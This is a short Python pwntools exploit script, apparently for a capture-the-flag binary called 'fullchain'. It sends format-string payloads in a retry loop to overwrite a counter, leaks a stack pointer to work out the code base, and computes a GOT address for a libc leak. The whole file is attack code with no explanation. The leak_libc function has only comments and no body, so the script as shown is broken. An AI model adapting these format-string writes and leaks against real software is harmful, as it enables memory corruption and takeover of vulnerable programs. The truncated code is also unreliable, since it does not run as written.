from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# Helper function
def myread(r, data, pos):
    r.sendlineafter("local > ", pos.encode())
    r.sendlineafter("write > ", b"read")
    r.sendline(data)

def mywrite(r, pos):
    r.sendlineafter("global or local > ", pos.encode())
    r.sendlineafter("set, read or write > ", b"write")

def connect():
    r = process('./fullchain')

    exploit = int('0x47', 16)
    exploit2 = 255 - 0x47
    fmt_payload = f"%{exploit}c%10$hhn%{exploit2}c%18$hhn\0"
    # Try to replace cnt
    while True:
        try:
            myread(r, fmt_payload, 'global')
            mywrite(r, 'global')
            mywrite(r, 'global')
            mywrite(r, 'global')
            break
        except:
            r.close()
            r = process('./fullchain')
    return r

def leak_codebase(r):
    codebase_payload = "%7$p\0"
    myread(r, codebase_payload, 'global')
    mywrite(r, 'global')
    resp = r.recv(14).decode()
    global_addr =  int(resp, 16)
    code_base = global_addr - 0x40b0
    return code_base

def leak_libc():
    # 1. write target address to memory
    # 2. read then write


r = connect()
code_base = leak_codebase(r)
global_addr = code_base + 0x40b0
printf_glt_addr = code_base + 0x4048

leak_libc()



